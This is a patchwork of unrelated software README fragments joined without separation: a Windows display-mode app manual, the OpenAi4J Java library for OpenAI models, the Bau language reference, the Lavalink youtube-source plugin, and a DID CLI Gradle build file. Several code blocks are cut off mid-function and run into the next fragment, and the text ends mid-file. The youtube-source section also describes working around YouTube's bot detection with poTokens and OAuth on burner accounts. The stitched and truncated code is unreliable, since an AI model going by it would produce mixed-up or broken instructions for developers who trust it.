The application can start automatically when the user logs into Windows by clicking on the ""Run On Startup"" button. The arrow will turn green to indicate that this option is enabled. The application will start minimized to the system tray.

#### Refresh App

If you have created a custom display mode while the application is running, there is a ""Refresh App"" button that will refresh the application to reflect the new display mode.

#### Clear All Slots

All hot key slots for the selected display can be reset by clicking on the ""Clear All Slots"" button.

#### Minimize To Tray

The application will be minimized to the system tray when the ""Minimize To Tray"" button is pressed. To restore the application, click the system tray icon and select ""Restore"".

#### Exit App

To exit the application, click on the ""Exit App"" button. You can also exit the application from the system tray by clicking on the system tray icon and selecting ""Exit"".

# OpenAi4J

OpenAi4J is an unofficial Java library tailored to facilitate the interaction with OpenAI's GPT models, including the
newest additions such as gpt4-turbo vision,assistant-v2. Originally forked from TheoKanning/openai-java, this library
continues development to incorporate latest API features after the original project's maintenance was discontinued.

[中文介绍☕](README-zh.md)

## Features

- Full support for all OpenAI API models including Completions, Chat, Edits, Embeddings, Audio, Files, Assistants-v2,
  Images, Moderations, Batch, and Fine-tuning.
- Easy-to-use client setup with Retrofit for immediate API interaction.
- Extensive examples and documentation to help you start quickly.
- Customizable setup with environment variable integration for API keys and base URLs.
- Supports synchronous and asynchronous API calls.

This library aims to provide Java developers with a robust tool to integrate OpenAI's powerful capabilities into their
applications effortlessly.

# Quick Start

## Import
### Gradle

`implementation 'io.github.lambdua:<api|client|service>:0.22.4'`
### Maven
```xml

<dependency>
  <groupId>io.github.lambdua</groupId>
  <artifactId>service</artifactId>
    <version>0.22.4</version>
</dependency>
```

## chat with OpenAi model

```java
static void simpleChat() {
  //api-key get from environment variable OPENAI_API_KEY
  OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
  List<ChatMessage> messages = new ArrayList<>();
  ChatMessage systemMessage = new SystemMessage(""You are a cute cat and will speak as such."");
  messages.add(systemMessage);
  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4o-mini"")
          .messages(messages)
          .n(1)
          .maxTokens(50)
          .build();
  ChatCompletionResult chatCompletion = service.createChatCompletion(chatCompletionRequest);
  System.out.println(chatCompletion.getChoices().get(0).getMessage().getContent());
}
```

# Just Using POJO

If you wish to develop your own client, simply import POJOs from the api module.</br>
Ensure your client adopts snake case naming for compatibility with the OpenAI API.
To utilize pojos, import the api module:

```xml

<dependency>
  <groupId>io.github.lambdua</groupId>
  <artifactId>api</artifactId>
    <version>0.22.4</version>
</dependency>
```

# other examples:

The sample code is all in the `example` package, which includes most of the functional usage. </br>
You can refer to the code in the example package. Below are some commonly used feature usage examples

<details>
<summary>gpt-vision image recognition</summary>

```java
static void gptVision() {
  OpenAiService service = new OpenAiService(Duration.ofSeconds(20));
  final List<ChatMessage> messages = new ArrayList<>();
  final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
  //Here, the imageMessage is intended for image recognition
  final ChatMessage imageMessage = UserMessage.buildImageMessage(""What's in this image?"",
          ""https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Gfp-wisconsin-madison-the-nature-boardwalk.jpg/2560px-Gfp-wisconsin-madison-the-nature-boardwalk.jpg"");
  messages.add(systemMessage);
  messages.add(imageMessage);

  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4-turbo"")
          .messages(messages)
          .n(1)

<summary>Customizing OpenAiService</summary>
OpenAiService is versatile in its setup options, as demonstrated in the `example.ServiceCreateExample` within the example package.

```java
//0 Using the default configuration, read the environment variables OPENAI-API_KEY, OPENAI-API_BASE-URL as the default API_KEY and BASE-URL,
//encourage the use of environment variables to load the OpenAI API key
OpenAiService openAiService0 = new OpenAiService();
//1.Use the default base URL and configure service by default. Here, the base URL (key: OPENAI API BASE URL) will be obtained from the environment variable by default. If not, the default URL will be used“ https://api.openai.com/v 1/"";
OpenAiService openAiService = new OpenAiService(API_KEY);
//2. Use custom base Url with default configuration of service
OpenAiService openAiService1 = new OpenAiService(API_KEY, BASE_URL);
//3.Custom expiration time
OpenAiService openAiService2 = new OpenAiService(API_KEY, Duration.ofSeconds(10));
//4. More flexible customization
//4.1. customize okHttpClient
OkHttpClient client = new OkHttpClient.Builder()
        //connection pool
        .connectionPool(new ConnectionPool(Runtime.getRuntime().availableProcessors() * 2, 30, TimeUnit.SECONDS))
        //Customized interceptors, such as retry interceptors, log interceptors, load balancing interceptors, etc
        // .addInterceptor(new RetryInterceptor())
        // .addInterceptor(new LogInterceptor())
        // .addInterceptor(new LoadBalanceInterceptor())
        // .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""proxyHost"", 8080)))
        .connectTimeout(2, TimeUnit.SECONDS)
        .writeTimeout(3, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .protocols(Arrays.asList(Protocol.HTTP_2, Protocol.HTTP_1_1))
        .build();
//4.2 Customizing Retorfit Configuration
Retrofit retrofit = OpenAiService.defaultRetrofit(client, OpenAiService.defaultObjectMapper(), BASE_URL);
OpenAiApi openAiApi = retrofit.create(OpenAiApi.class);
OpenAiService openAiService3 = new OpenAiService(openAiApi);

<summary>Tools</summary>
This library supports both the outdated method of function calls and the current tool-based approach.

First, we define a function object. The definition of a function object is flexible; you can use POJO to define it (
automatically serialized by JSON schema) or use methods like `map` and `FunctionDefinition` to define it. You can refer
to the code in the example package. Here, we define a weather query function object:

```java
public class Weather {
    @JsonPropertyDescription(""City and state, for example: León, Guanajuato"")
    public String location;
    @JsonPropertyDescription(""The temperature unit, can be 'celsius' or 'fahrenheit'"")
    @JsonProperty(required = true)
    public WeatherUnit unit;
}
public enum WeatherUnit {
    CELSIUS, FAHRENHEIT;
}
public static class WeatherResponse {
    public String location;
    public WeatherUnit unit;
    public int temperature;
    public String description;
    
    // constructor
}
```

Next, we declare the function and associate it with an executor, here simulating an API response:

```java
//First, a function to fetch the weather
public static FunctionDefinition weatherFunction() {
    return FunctionDefinition.<Weather>builder()
            .name(""get_weather"")
            .description(""Get the current weather in a given location"")
            .parametersDefinitionByClass(Weather.class)
            //The executor here is a lambda expression that accepts a Weather object and returns a Weather Response object
            .executor(w -> new WeatherResponse(w.location, w.unit, 25, ""sunny""))
            .build();
}
```

Then, the service is used for a chatCompletion request, incorporating the tool:

```java
static void toolChat() {
    OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
    final ChatTool tool = new ChatTool(ToolUtil.weatherFunction());
    final List<ChatMessage> messages = new ArrayList<>();
    final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
    final ChatMessage userMessage = new UserMessage(""What is the weather in BeiJin?"");
    messages.add(systemMessage);
    messages.add(userMessage);

    ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            //Tools is a list; multiple tools can be included
            .tools(Collections.singletonList(tool))
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(100)
            .build();
    //Request is sent
    ChatCompletionChoice choice = service.createChatCompletion(chatCompletionRequest).getChoices().get(0);
    AssistantMessage toolCallMsg = choice.getMessage();
    ChatToolCall toolCall = toolCallMsg.getToolCalls().get(0);
    System.out.println(toolCall.getFunction());

    messages.add(toolCallMsg);
    messages.add(new ToolMessage(""the weather is fine today."", toolCall.getId()));

    //submit tool call
    ChatCompletionRequest toolCallRequest = ChatCompletionRequest.builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .n(1)
            .maxTokens(100)
            .build();
    ChatCompletionChoice toolCallChoice = service.createChatCompletion(toolCallRequest).getChoices().get(0);
    System.out.println(toolCallChoice.getMessage().getContent());
}
```

<summary>Assistant Stream Manager</summary>

By using the `AssistantEventHandler` class and the `AssistantStreamManager` class, it is easier to manage the streaming
calls of Assistant `AssistantEventHandler` contains all Assistant stream event callback hooks, and you can implement
different events as needed:

```java
    /**
     * You can implement various event callbacks for Assistant Event Handlers according to your own needs, making it convenient for you to handle various events related to Assistant
     */
    private static class LogHandler implements AssistantEventHandler {
        @Override
        public void onEvent(AssistantSSE sse) {
            //every event will call this method
        }

        @Override
        public void onRunCreated(Run run) {
            System.out.println(""start run: "" + run.getId());
        }

        @Override
        public void onEnd() {
            System.out.println(""stream end"");
        }

        @Override
        public void onMessageDelta(MessageDelta messageDelta) {
            System.out.println(messageDelta.getDelta().getContent().get(0).getText());
        }

        @Override
        public void onMessageCompleted(Message message) {
            System.out.println(""message completed"");
        }

        @Override
        public void onMessageInComplete(Message message) {
            System.out.println(""message in complete"");
        }

        @Override
        public void onError(Throwable error) {
            System.out.println(""error:"" + error.getMessage());
        }
    }
```

`AssistantStreamManager` arranges and manages various events in the stream, supporting synchronous/asynchronous
retrieval of content from the stream,
which can be obtained through the manager. Below is a usage example, for more examples, please refer
to `AssistantStreamManagerTest.java`.

```java

    AssistantStreamManager streamManager = AssistantStreamManager.start(service.createRunStream(threadId, runCreateRequest), new LogHandler());


    //Other operations can be performed here...
    boolean completed = streamManager.isCompleted();


    // you can shut down the streamManager if you want to stop the stream
    streamManager.shutDown();

    //waiting for completion
    streamManager.waitForCompletion();
    // all of flowable events
    List<AssistantSSE> eventMsgsHolder = streamManager.getEventMsgsHolder();

    Optional<Run> currentRun = streamManager.getCurrentRun();
    // get the accumulated message
    streamManager.getAccumulatedMsg().ifPresent(msg -> {

thomasmueller/bau-lang,main,"# Bau

Bau is a simple, concise, safe, powerful and fast programming language. Features:

* Easy to learn. Concise syntax.
* Memory-safe. Statically typed.
* Fast compilation and execution (transpiles to C).

<a href=""https://thomasmueller.github.io/bau-lang/"">Try it out in the browser.</a>

It addresses other languages' issues:

* Memory safety (C, C++)
* Hard to use and master (C++, Rust)
* Vendor lock-in (Java, Swift, C#)
* GC pauses (Python, Java, C#,...)
* Verbose syntax (C, Go, Java,...)
* Slow execution (Python)
* Null pointer errors (Java, C,...)
* Array bound checks (Java, Rust,...)

## Example

    fun fact(x int) int
        if x <= 1
            return 1
        return x * fact(x - 1)

    for i:= range(0 20)
        println(fact(i))

## Keywords

Control flow
* `if` `elif` `else` `for` `while`
* `break` `continue` `return`
* `throw` `catch` `switch` `case`

Assignment, comparison, operations
* `:` constant, `:=`  variable
* `=` `+=` `-=` `*=` `/=` etc. update
* `=` `<` `>` `<=` `>=` `<>`
* `and` `or` `not` `+` `-` `*` `/` `%`
* `&` `|` `^` `~` `<<` `>>` bitwise

Data types and miscellaneous
* `int` `i32` `i16` `i8`, `float` `f32`
* `#` comment, `##` block comment
* `fun` `type` `enum` `const` `macro`
* `import` `module` `null`
* `()` `[]` `.` `..` `,` `'` `` ` `` `?`

### Constants, Variables

Identifiers contain letters, digits, and `_`.
`:` defines a constant.
`:=` defines a variable. `=` `+=` `-=` `*=`
`/=` `&=` `|=` `^=` `<<=` `>>=` updates it:

    PI : 3.14159
    x := 10
    x = x + 1
    x += 1      # shortcut

A variable without value requires a type:

    x int

### Built-In Types

The built-in types are `int` `i32` `i16` `i8` (signed integer),
and `float` `f32` (floating point).
`int` can be restricted to a range using `0..`.
Defaults are `int` and `float`; both are 64 bit.
Conversion functions change the type, and may truncate.

    c := i8(10)
    
### Conditions

`if` starts a condition.
Spaces group statements into blocks.
`elif` (else if) and `else` are optional.

    if a = 0
        println('zero')
    elif a = 1
        println('one')
    else
        println('many')

### Loops

There are `for` and `while` loops.
`,` is optional if the arguments are simple:

    # loop from 0 to 9
    for i := range(0 10)
        println(i)

`for` is internally converted to `while`:

    i := 0
    while i < 10
        println(i)
        i += 1

`break` exits a loop. It may have a condition:

    # prints 1 to 4
    for i := range(1 10)
        break i = 5
        println(i)

### Comments

`#` starts a line comments; 
two or more start and end a block comment.

    # Line comment
    
    ##
    Block comment
    ##

Comments before types and functions are
converted to documentation.

### Literals

Numbers start with a digit. `_` is ignored.
`.` is floating point, `0x` hexadecimal. 

Strings starting with `'` 
may contain `\n` newline, `\t` tab, `\'` single quote, 
`\\` backslash, `\x00` byte. UTF-8 is used.

Raw strings don't have escapes 
and start and end with one or more `` ` ``.
Multi-line ones begin on the next line 
and may be indented.

    a : 1_000_000
    b : 3.1415
    c : 0xcafe
    d : 'String literal'
    e : `Raw string`
    f : ``
        Two-line
        raw string with `
        ``

### Operators

`=` `<` `>` `<=` `>=` `<>` compare two values and return `1` or `0`.
`not` inverses a comparison. `and` `or` combines comparisons;
the right side is only evaluated when needed.
Integer `+` `-` `*` wrap around on over- / underflow.
`/` `%`: integer division by 0 returns max, min, or 0.
`&` `|` `^` `~` `<<` `>>` are bitwise and, or, xor, not, 
shift right, and logical shift right: the leftmost bits become `0`.

### Functions

`fun` starts a function. It may `return` a value.
`..` means variable number of arguments.
Functions can share a name if the number of arguments is different.
They can be declared first and implemented later.
`const` functions are executed at compile time
if the arguments are constants.
`macro` function calls are replaced at compile time
with the implementation.
Types can be passed as parameters or implicitly
(internally, this functions are templates).

    fun square(x int) int
        return x * x

    fun sum(x int..) const int
        sum := 0
        for i := until(x.len)
            sum += x[i]
        return sum

    fun if(cond int, true T, false T) macro T
        if cond
            return true
        else
            return false
    
    println('sum: ' sum(1 2 3))
    for i := until(5)
        println(square(i))
        println(if(i % 2, 'odd', 'even'))

### Types

Types can have fields and functions:

    type Square
        length int
    fun Square area() int
        return length * length
    s : new(Square)
      
If a type has a `close` function, then it is called
before the memory is freed.
`int` and other lowercase types are copied when assigned;
uppercase types are referenced.
Functions on built-in types are allowed:

    fun int square() int
        return this * this
    println(12.square())

Types can have parameters:

    type List(T)
        array T[]
        size int
    fun newList(T type) List(T)
        ...
    list := newList(Circle)

### Null

`?` means it may be `null`. 
An explicit check is required before using the value.
There are no null pointer errors at runtime.

    fun get(key int) Circle?
        # may return null

    v : get(key) 
    if v
        print(v.area())

Value types (eg. `int`) can't be `null`.

### Arrays Access

To create and access arrays, use:

    data : new(i8[], 3)
    data[0] = 10

Bounds are checked where needed.
Access without runtime checks require that the compiler verifies correctness.
Index variables with range restrictions allow this.
For performance-critical code, use `[` `]!` to ensure
no runtime checks are done.
The conditional `break` guarantees that `i` is within the bounds.

    if data.len
        i := 0..data.len
        while 1
            data[i]! = i
            next : i + 1
            break next >= data.len
            i = next

### Exceptions

`throw` throws an exception. `catch` is needed,
or the method needs `throws`.
Custom exception types are allowed.

    import org.bau.Exception
        exception

    fun square(x int) int throws exception
        if x > 3_000_000_000
            throw exception('Too big')
        return x * x
    
    x := square(3_000_000_001)
    println(x)
    catch e
        println(e.message)

### Modules and Import

`import` allows using types and functions from a module.
The last part of the module name is the identifier.
The module identifier can be omitted
if the type, function, or constant is listed after `import`.
The full module name can be used as well.

    import org.bau.Utils
        random
    import org.bau.Math
    println(random())
    println(Utils.getNanoTime())
    println(Math.PI)
    println(org.bau.Math.PI)

`module` defines a module. 
The name needs to match the file path, here `org/bau/Math.bau`:

    module org.bau.Math
    PI : 3.14159265358979323846

### Non-Features

* Many concepts of object-oriented programming languages are not supported,
  for example inheritance, method overloading, polymorphism,
  and more complex encapsulation.
* Many concepts of functional programming languages are not supported, 
  for example high-order functions, functional composition,
  closures.
* Reflection is not supported.
* Tail calls are only optimized by the C compiler.
* Multi-threading support is limited to what C supports.
* Coroutines are not supported.
* `goto` and labels are not supported.
* String interpolation is not supported to simplify the language. 
  Instead, use an arrays of strings. As commas are optional, this is short.
* Dynamic dispatch is not supported.

### Syntax

* Spaces (indentation) is used to group statements. This reduces the number of lines.
  Tabs are not supported. The reason is that spaces are more common,
  and tabs do not mix well with spaces. By disallowing tabs, problems are detected early.
* Commas in parameter lists are optional, if parameters are simple values.
  The same as in shell scripts or Lisp.
  This also makes 'print' statements more readable (without string interpolation).
* There is no `boolean` data type to simplify the syntax. 
  Instead, `true` is `1` and `false` is `0`.
  The common pitfalls, e.g. comparing the result of a comparison,
  requires parenthesis (eg. `a > b < c` is not allowed).
* Constants and variables are defined in a different way (`:` vs `:=`)
  so that it's easier to see for a reader if it may change later.
  But there is no keyword like ""var"", ""val"", ""const"", or ""final"" to shorten the code.
* Definition of a variables is distinct from updating it (`:=` vs `=`) to quickly
  detect if a variable was already defined, and to detect typos.
* `break` and `continue` can have a condition, to avoid a separate line with `if`.
* Labels for `break` and `continue` are not supported to simplify the language.
  If needed, the function can return from inside the loop, or throw an exception
  (such exceptions are very fast).
* Comments are only a single character (`#`) to save some typing.
  Block comments (`##`) are useful if the editor doesn't support commenting a block.
  To support eg. Markdown inside of block comments, the delimiters can be variable length.
* Raw strings are useful, to avoid escaping problems: https://xkcd.com/1638/
* Multi-line strings are always raw strings, 
  as escape sequences don't seem useful for this (tabs are supported here).
* Dangling `,` are supported to e.g. simplify re-ordering entries.
* Bit operations `|`, `&`, `^`, `~` have a higher order of precedence than comparison.
  This is different from other programming languages.
  It seems the reason why it is different in other languages is historical reasons only.
* Instead of `&&` `||` `!` we use the keywords `and`, `or` and `not`, 
  to make these common cases easier to understand for new developers,
  and in case of `not` to make it easier to read.
* There are no separate unsigned data types, to simplify the language.
* Bitwise shift to the right (`>>`) is a logical shift, that means for negative values,
  a number of zeros are added to the left. The arithmetic shift is not supported
  by the language itself, but can be supported by a library function
  (same as eg. rotation). The reason is that logical shifts are more common.

### Safety 
* There is no way to write unsafe code, except by calling C methods.
* Array bounds are check, except if array access is guaranteed to be 
  inside the bounds. This is implemented using dependent types.
  
### Memory Management
* Reference counting is used for reference types.
* Mark-and-sweep garbage collection is not used to avoid pauses.
* Borrow checking is not used to simplify writing code.
* The plan is to use reference counting only where cycles are not possible.
* The plan is to support weak references.
* The plan is to support unique pointers, and arrays of pre-allocated objects 
  accessed via handlers and a generation

### Exceptions and Panic
* Exceptions need to be handled using `catch`, or re-thrown.
* There is no `try` keyword: `catch` will catch all exceptions in the same scope.
  This is to simplify the code, and reduce the need of indentation.
  Ruby supports a similar syntax: `begin` is not needed.
* Custom exception types are allowed, with some restrictions:
  Exception types need to have an integer field `exceptionType`
  that may not have a negative value (because internally, this field
  is used to to flag whether the method was successful or not,
  and a negative value is used to indicate success).
* Possible null references need to be handled. 
  There is no way that null references can throw an exception or panic.
* Integer division (`/`) by zero, the same as floating point division by zero,
  doesn't throw an exception. Instead, it returns the highest / lowest value
  (if dividing positive or negative numbers), or zero (for zero by zero).
  This is to be more consistent with the floating point division, and
  to avoid panic for cases were it was used for ""unimportant"" operations
  such as calculating the number of instructions per second, for zero seconds.
  The same goes for modulo operations.

## common
This module provides the base source manager, which can be used with any
`com.sedmelluq.discord.lavaplayer` packages still on major version `1`.

<details>
<summary>Using in Gradle:</summary>

```kotlin
repositories {
  // replace with https://maven.lavalink.dev/snapshots if you want to use a snapshot version.
  maven(url = ""https://maven.lavalink.dev/releases"")
}

dependencies {
  // Replace VERSION with the current version as shown by the Releases tab or a long commit hash `-SNAPSHOT` for snapshots.
  implementation(""dev.lavalink.youtube:common:VERSION"")
}
```

</details>
Example usage:

```java
YoutubeAudioSourceManager youtube = new YoutubeAudioSourceManager();
// Optionally, you may instantiate the source with a custom options, such as toggling use of searching, and clients.
YoutubeAudioSourceManager youtube = new YoutubeAudioSourceManager(/*allowSearch:*/ true, new Client[] { new Music(), new Web(), new AndroidTestsuite() });
```

You may also extend the `Client` interface to support additional InnerTube clients. There are a few abstract classes to
make this easier, notably, `MusicClient` (for `music.youtube.com` InnerTube clients), `NonMusicClient` (for youtube.com
innertube clients) and `StreamingNonMusicClient` (for clients that can be used to stream videos).

Support for IP rotation has been included, and can be achieved using the following:
```java

## v2
This modules expands on `common` by providing additional support for
Lavaplayer `2.x` clients, such as [Lavalink-Devs/Lavaplayer](https://github.com/lavalink-devs/lavaplayer).
Such features currently include thumbnail support within `AudioTrackInfo`.
Additional clients are included that provide access to this additional information.
These clients are suffixed with `Thumbnail`, such as `WebWithThumbnail`, `AndroidWithThumbnail` etc.

<details>
<summary>Using in Gradle:</summary>

```kotlin
repositories {
  // replace with https://maven.lavalink.dev/snapshots if you want to use a snapshot version.
  maven(url = ""https://maven.lavalink.dev/releases"")
}

dependencies {
  // Replace VERSION with the current version as shown by the Releases tab or a long commit hash `-SNAPSHOT` for snapshots.
  implementation(""dev.lavalink.youtube:v2:VERSION"")
}
```

</details>

Example usage:
```java
// same as the 'common' module but there are additional clients that provide video thumbnails in the returned metadata.
YoutubeAudioSourceManager youtube = new YoutubeAudioSourceManager(/*allowSearch:*/ true, new Client[] { new MusicWithThumbnail(), new WebWithThumbnail(), new AndroidTestsuiteWithThumbnail() });
```

## plugin
This module serves as the plugin for use with [Lavalink](https://github.com/lavalink-devs/Lavalink).

To use this plugin with Lavalink, you must declare the dependency.

<details>
<summary>Using with Lavalink v3:</summary>

```yaml
lavalink:
  plugins:
    # Replace VERSION with the current version as shown by the Releases tab or a long commit hash for snapshots.
    - dependency: ""dev.lavalink.youtube:youtube-plugin:VERSION""
      repository: ""https://maven.lavalink.dev/releases"" # use https://maven.lavalink.dev/snapshots if you want to use a snapshot version.
```

</details>

<details>
<summary>Using with Lavalink v4:</summary>

```yaml
lavalink:
  plugins:
    # Replace VERSION with the current version as shown by the Releases tab or a long commit hash for snapshots.
    - dependency: ""dev.lavalink.youtube:youtube-plugin:VERSION""
      snapshot: false # Set to true if you want to use a snapshot version.
```

</details>

Configuring the plugin:
> [!IMPORTANT]
> You must make sure to disable the built-in YouTube source like so:
```yaml
lavalink:
  server:
    sources:
      youtube: false
```

> [!NOTE]
> Existing options, such as `ratelimit` and `youtubePlaylistLoadLimit` will be picked up automatically by the plugin,
> so these don't need changing.
> 
```yaml
plugins:
  youtube:
    enabled: true # Whether this source can be used.
    allowSearch: true # Whether ""ytsearch:"" and ""ytmsearch:"" can be used.
    allowDirectVideoIds: true # Whether just video IDs can match. If false, only complete URLs will be loaded.
    allowDirectPlaylistIds: true # Whether just playlist IDs can match. If false, only complete URLs will be loaded.
    # The clients to use for track loading. See below for a list of valid clients.
    # Clients are queried in the order they are given (so the first client is queried first and so on...)
    clients:
      - MUSIC
      - ANDROID_VR
      - WEB
      - WEBEMBEDDED 
```

### Advanced Options
```yaml
    # The below section of the config allows setting specific options for each client, such as the requests they will handle.
    # If an option, or client, is unspecified, then the default option value/client values will be used instead.
    # If a client is configured, but is not registered above, the options for that client will be ignored.
    # WARNING!: THE BELOW CONFIG IS FOR ILLUSTRATION PURPOSES. DO NOT COPY OR USE THIS WITHOUT
    # WARNING!: UNDERSTANDING WHAT IT DOES. MISCONFIGURATION WILL HINDER YOUTUBE-SOURCE'S ABILITY TO WORK PROPERLY.

    # Write the names of clients as they are specified under the heading ""Available Clients"".
    clientOptions:
      WEB:
        # Example: Disabling a client's playback capabilities.
        playback: false
        videoLoading: false # Disables loading of videos for this client. A client may still be used for playback even if this is set to 'false'.
      WEBEMBEDDED:
        # Example: Configuring a client to exclusively be used for video loading and playback.
        playlistLoading: false # Disables loading of playlists and mixes.
        searching: false # Disables the ability to search for videos.
```

## Using OAuth Tokens
You may notice that some requests are flagged by YouTube, causing an error message asking you to sign in to confirm you're not a bot.
With OAuth integration, you can request that `youtube-source` use your account credentials to appear as a normal user, with varying degrees
of efficacy. **You do _not_ need to use `poToken` with OAuth.**

> [!WARNING]
> Similar to the `poToken` method, this is NOT a silver bullet solution, and worst case could get your account terminated!
> For this reason, it is advised that **you use burner accounts and NOT your primary!**.
> This method may also trigger ratelimit errors if used in a high traffic environment.
> USE WITH CAUTION!

> [!NOTE]
> You may need to set your log level for `dev.lavalink.youtube.http.YoutubeOauth2Handler` to `INFO`, to see additional information
> within your terminal regarding completing the OAuth flow.

> [!NOTE]
> If you do not have a refresh token, then do not supply one. The source will output your refresh token into your terminal upon
> successfully completing the OAuth flow at least **once**. If you do not see your token, you may need to configure your
> logging (see above note).

You can instruct `youtube-source` to use OAuth with the following:

### Lavaplayer
```java
YoutubeAudioSourceManager source = new YoutubeAudioSourceManager();
// This will trigger an OAuth flow, where you will be instructed to head to YouTube's OAuth page and input a code.
// This is safe, as it only uses YouTube's official OAuth flow. No tokens are seen or stored by us.
source.useOauth2(null, false);

// If you already have a refresh token, you can instruct the source to use it, skipping the OAuth flow entirely.
// You can also set the `skipInitialization` parameter, which skips the OAuth flow. This should only be used
// if you intend to supply a refresh token later on. You **must** either complete the OAuth flow or supply
// a refresh token for OAuth integration to work.
source.useOauth2(""your refresh token"", true);
```

### Lavalink
```yaml
plugins:
  youtube:
    enabled: true
    oauth:
      # setting ""enabled: true"" is the bare minimum to get OAuth working.
      enabled: true

      # if you have a refresh token, you may set it below (make sure to uncomment the line to apply it).
      # setting a valid refresh token will skip the OAuth flow entirely. See above note on how to retrieve
      # your refreshToken.
      # refreshToken: ""paste your refresh token here if applicable""

      # Set this if you don't want the OAuth flow to be triggered, if you intend to supply a refresh token later.
      # Initialization is skipped automatically if a valid refresh token is supplied. Leave this commented if you're
      # completing the OAuth flow for the first time/do not have a refresh token.
      # skipInitialization: true
```

## Using a `poToken`
A `poToken`, also known as a ""Proof of Origin Token"" is a way to identify what requests originate from.
In YouTube's case, this is sent as a JavaScript challenge that browsers must evaluate, and send back the resolved
string. Typically, this challenge would remain unsolved for bots as more often than not, they don't simulate an entire
browser environment, instead only evaluating the minimum amount of JS required to do its job. Therefore, it's a reasonable
assumption that if the challenge is not fulfilled, the request origin is a bot.

To obtain a `poToken`, you can use https://github.com/iv-org/youtube-trusted-session-generator, by running the Python script
or the docker image. Both methods will print a `poToken` after a successful run, which you can supply to `youtube-source`
to try and work around having automated requests blocked.


> [!NOTE]
> A `poToken` is not a silver bullet, and currently it only applies to requests made via the `WEB` client.
> You do not need to specify a `poToken` if using OAuth, and vice versa.

Specifying the token is as simple as doing:

### Lavaplayer
```java
// Web is dev.lavalink.youtube.clients.Web
Web.setPoTokenAndVisitorData(""your po_token"", ""your visitor_data"");
```

### Lavalink
```yaml
plugins:
  youtube:
    pot:
      token: ""paste your po_token here""
      visitorData: ""paste your visitor_data here""
```

## REST routes (`plugin` only)
### `POST` `/youtube`

Body:

> [!NOTE]
> You do not need to provide everything as it is shown.
> For example, you can specify just `refreshToken` and `skipInitialization`, or just `poToken` and `visitorData`.
> You do **not** need to use `poToken` with OAuth and vice versa.

```json
{
  ""refreshToken"": ""your new refresh token"",
  ""skipInitialization"": true,
  ""poToken"": ""your po_token"",
  ""visitorData"": ""your visitor_data""
}
```

Response:

If the YouTube source is not enabled, or the `refreshToken` is invalid:
`500 - Internal Server Error`

Otherwise:
`204 - No Content`

### `GET` `/youtube`

Response:

If the YouTube source is not enabled:
`500 - Internal Server Error`

Otherwise:
```json
{
  ""refreshToken"": ""your current refresh token, or null""
}
```

### `GET` `/youtube/stream/{videoId}`

Query parameters:

| Key          | Value Type | Required | Notes                                                                                                                                                                       |
|--------------|------------|----------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| itag         | integer    | No       | The [itag](https://gist.github.com/AgentOak/34d47c65b1d28829bb17c24c04a0096f) of the desired format. If unspecified, youtube-source's default format selector will be used. |
| withClient   | string     | No       | The identifier of the client to use for streaming. Uses all clients if unspecified.                                                                                         |

Response:

If `videoId` could not be found or loaded, or the `itag` does not exist, or if no client supports format loading:
`400 - Bad Request`

Otherwise:
`200 - OK` accompanied by the selected format stream (audio or video). `Content-Type` header will be set appropriately.

## Migration from Lavaplayer's built-in YouTube source

This client is intended as a direct replacement for Lavaplayer's built-in `YoutubeAudioSourceManager`,
which has been deprecated in a recent release of [Lavalink-Devs/Lavaplayer](https://github.com/lavalink-devs/lavaplayer).

When using `AudioSourceManagers.registerRemoteSources(AudioPlayerManager)`, Lavaplayer will register its own
deprecated `YoutubeAudioSourceManager`, which must be disabled.
Some versions of Lavaplayer may include an optional `excludeSources` parameter, allowing you to toggle the adding of the source.
If the version you are using does not support this, you will need to manually register each `AudioSourceManager` yourself.

First, create and register an instance of the supported `YoutubeAudioSourceManager` from the `youtube-source` package.
```java
AudioPlayerManager playerManager = new DefaultAudioPlayerManager();
YoutubeAudioSourceManager ytSourceManager = new dev.lavalink.youtube.YoutubeAudioSourceManager();
playerManager.registerSourceManager(ytSourceManager);
```

If your version of Lavaplayer supports an `excludeSources` parameter or equivalent, you may exclude the built-in
`YoutubeAudioSourceManager` using the following:
```java
AudioSourceManagers.registerRemoteSources(playerManager,
                                          com.sedmelluq.discord.lavaplayer.source.youtube.YoutubeAudioSourceManager.class);
```

Otherwise, you will need to register each source manager individually.

In addition, there are a few significant changes to note:

- This source's class structure differs so if you had custom classes that you were initialising
  the source manager with (e.g. an overridden `YoutubeTrackDetailsLoader`), this **is not** compatible
  with this source manager.

## Build Method
: Create a JAR file based on the build.gradle file of this SDK project.
1. Open the `build.gradle` file of your project and add a task from the configuration file as shown below.

```groovy
plugins {
    id 'java'
    id 'com.github.johnrengelman.shadow' version '7.1.2'
}

repositories {
    mavenCentral()
    flatDir {
        dirs 'libs'
    }
}

group = 'org.omnione.did'

java {
    sourceCompatibility = JavaVersion.VERSION_17
    targetCompatibility = JavaVersion.VERSION_17
}

dependencies {
    implementation 'org.bouncycastle:bcprov-jdk18on:1.78.1'
    implementation 'com.fasterxml.jackson.core:jackson-databind:2.15.2'
    implementation group: 'info.picocli', name: 'picocli', version: '4.2.0'
    implementation group: 'com.google.code.gson', name: 'gson', version: '2.8.9'
    implementation 'org.hibernate.validator:hibernate-validator:7.0.0.Final'

    implementation files('libs/did-datamodel-sdk-server-1.0.0.jar')
    implementation files('libs/did-crypto-sdk-server-1.0.0.jar')
    implementation files('libs/did-core-sdk-server-1.0.0.jar')
    implementation files('libs/did-wallet-sdk-server-1.0.0.jar')
}

shadowJar {
    archiveBaseName.set('did-cli-tool-server')
    archiveVersion.set('1.0.0')
    archiveClassifier.set('')

    manifest {
        attributes(
                'Main-Class': 'org.omnione.did.cli.OmniCLI'
        )
    }
}

tasks.named('jar').configure {
    enabled = false
}

tasks.withType(JavaCompile) {
    options.encoding = 'UTF-8'

